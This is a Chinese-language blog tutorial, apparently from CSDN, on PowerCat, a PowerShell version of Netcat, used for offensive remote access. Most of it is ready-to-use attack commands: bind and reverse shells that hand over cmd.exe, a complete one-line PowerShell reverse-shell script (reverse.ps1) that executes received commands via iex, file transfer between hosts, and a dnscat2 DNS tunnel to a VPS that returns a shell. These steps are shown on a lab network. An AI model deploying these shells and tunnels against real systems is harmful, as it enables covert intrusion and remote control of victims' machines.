**目录**

[PowerCat的用法](#t0 "PowerCat的用法")

[正向连接](#t1 "正向连接")

[反向连接](#t2 "反向连接")

[Windows之间互弹shell](#t3 "Windows之间互弹shell")

[方法一：](#t4 "方法一：")

[方法二：](#t5 "方法二：")

[Powercat传输文件](#t6 "Powercat传输文件")

[PowerCat进行DNS隧道通信](#t7 "PowerCat进行DNS隧道通信")

* * *

> **注：在执行完powercat的命令后，还需要按enter键，对面才能接收到shell**

PowerCat是Netcat的[Powershell](https://so.csdn.net/so/search?q=Powershell&spm=1001.2101.3001.7020)版本，作者是这么介绍的，项目地址：[https://github.com/besimorhino/powercat](https://github.com/besimorhino/powercat "https://github.com/besimorhino/powercat")

![](https://img-blog.csdnimg.cn/20191204230942485.png)

PowerCat的用法
===========

![](https://img-blog.csdnimg.cn/20200220110139363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

参数的意义

```
-l      监听一个连接                             
-c      连接到一个监听      
-p      指定端口      
-e      指定一个程序执行      
-ep     执行Powershell             
-v      显示详细信息           
-r      Relay. Format: "-r tcp:10.1.1.1:443"                 [String]      
-u      Transfer data over UDP.                              [Switch]      
-dns    Transfer data over dns (dnscat2).                    [String]      1
-dnsft  DNS Failure Threshold.                               [int32]      1
-t      Timeout option. Default: 60                          [int32]      1
-i      Input: Filepath (string), byte array, or string.     [object]      1
-o      Console Output Type: "Host", "Bytes", or "String"    [String]      1
-of     Output File Path.                                    [String]      1
-d      Disconnect after connecting.                         [Switch]      1
-rep    Repeater. Restart after disconnecting.               [Switch]      1
-g      Generate Payload.                                    [Switch]      1
-ge     Generate Encoded Payload.                            [Switch]      1
-h      打印出帮助
```


由于PowerCat是NetCat的PowerShell形式，所以，PowerCat可以无缝的和Netcat连接。PowerCat的用法和Netcat几乎一模一样。

正向连接
----

Windows上的powercat正向连接[Kali](https://so.csdn.net/so/search?q=Kali&spm=1001.2101.3001.7020)上的nc

```
Kali(192.168.10.11)：       
    nc -lvp 8888      
Windows:       
    Import-Module .\powercat.ps1      
    powercat -c 192.168.10.11 -p 8888 -e cmd.exe
```


![](https://img-blog.csdnimg.cn/20200220112857575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

反向连接
----

Kali上的nc反向连接Windows上的powercat

```
Kali：      
    nc 192.168.10.1 8888 -vv      
Windows(192.168.10.1)：      
    Import-Module .\powercat.ps1      
    powercat -l -p 8888 -e cmd.exe -v
```


![](https://img-blog.csdnimg.cn/20200220112619141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

Windows之间互弹shell
----------------

### **方法一：**

```
服务器监听(192.168.10.1)：      
    Import-Module .\powercat.ps1      
    powercat -l -p 8888       
客户端连接:      
    Import-Module .\powercat.ps1      
    powercat -c 192.168.10.1 -p 8888 -ep
```


[

\[初学入门\]ArcGIS中Python脚本的使用

application/x-zip ![](https://csdnimg.cn/release/blogv2/dist/components/img/star.png) 4星 超过85%的资源 490KB

![](https://csdnimg.cn/release/blogv2/dist/components/img/arrowDownWhite.png)

下载



](https://download.csdn.net/download/woshi805002103/3544163)

![](https://img-blog.csdnimg.cn/20191204232911403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### **方法二：**

```
服务器监听(192.168.10.1)：      
    Import-Module .\powercat.ps1      
    powercat -l -p 8888       
客户端连接:      
    .\reverse.ps1
```


其中，reverse.ps1 脚本的内容如下

```
$client = New-Object System.Net.Sockets.TCPClient('192.168.10.1',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```


![](https://img-blog.csdnimg.cn/20191204233319413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

Powercat传输文件
------------

此时，即使文件传输完毕，连接也不会自动端开，需要手动断开。

```
接收端：Windows10(192.168.10.1)      
    Import-Module .\powercat.ps1      
    powercat -l -p 8888 -of test.txt -v      
发送端：Windows7(192.168.10.130)      
    Import-Module .\powercat.ps1      
    powercat -c 192.168.10.1 -p 8888 -i C:\Users\xie\Desktop\test.txt -v
```


![](https://img-blog.csdnimg.cn/20200220113859298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

PowerCat进行DNS隧道通信
-----------------

PowerCat也是一套基于DNS通信的协议，PowerCat的DNS通信是基于dnscat。所以，在使用DNS隧道通信前，需要在我们的VPS上安装dnscat。

**安装dnscat**

```
git clone https://github.com/iagox86/dnscat2.git      
cd dnscat2/server/      
gem install bundler      
bundle install
```


[

bat 脚本的基本语法和例子

txt ![](https://csdnimg.cn/release/blogv2/dist/components/img/star.png) 0星 超过10%的资源 17KB

![](https://csdnimg.cn/release/blogv2/dist/components/img/arrowDownWhite.png)

下载



](https://download.csdn.net/download/xuheazx/4337266)

![](https://img-blog.csdnimg.cn/20200220221045294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

安装完dnscat后，在VPS上执行如下命令

```
ruby dnscat2.rb ttpowercat.test -e open --no-cache
```


![](https://img-blog.csdnimg.cn/20200221000837521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

在Windows上执行如下命令

```
powercat -c 192.168.10.11 -p 53 -dns ttpowercat.test -e cmd.exe
```


![](https://img-blog.csdnimg.cn/20200221000859839.png)

然后我们的Kali上就能收到反弹过来的shell了

执行 session -i 1 进入反弹过来的shell中，就可以执行whoami等系统命令了

![](https://img-blog.csdnimg.cn/20200221000949785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)